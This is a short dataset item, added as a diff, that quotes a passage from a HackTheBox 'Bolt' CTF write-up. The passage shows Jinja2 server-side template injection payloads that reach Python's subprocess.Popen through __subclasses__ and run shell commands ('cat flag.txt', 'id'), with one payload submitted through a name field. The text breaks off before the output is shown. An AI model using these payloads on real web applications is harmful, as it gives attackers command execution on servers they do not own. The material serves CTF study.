@@ -1,0 +1,9 @@
+TECHNIQUE / QUESTION:
+Describe the steps or process outlined in the following text: (Context: Writeup from Htb Bolt Hacks Stuff)
+
+CONTEXT:
+Source: Htb Bolt Hacks Stuff
+Section: Writeup
+
+METHOD / ANSWER:
+show a ? in there where it’s not clear how to get subprocess.PIPE . PayloadsAllTheThings shows the answer with this example: {{ '' . __class__ . mro ()[ 1 ]. __subclasses__ ()[ 396 ]( ' cat flag.txt ' , shell = True , stdout =- 1 ). communicate ()[ 0 ]. strip ()}} The Python source also shows subprocess.PIPE is -1, so I can just use that value and not need to reference the object. I’ll give this payload a try, submitting it as my name: {{ '' . __class__ . __mro__ [ 1 ]. __subclasses__ ()[ 222 ]( ' id ' , shell = True , stdout =- 1 ). communicate () }} On clicking the confirm link, I get the result:
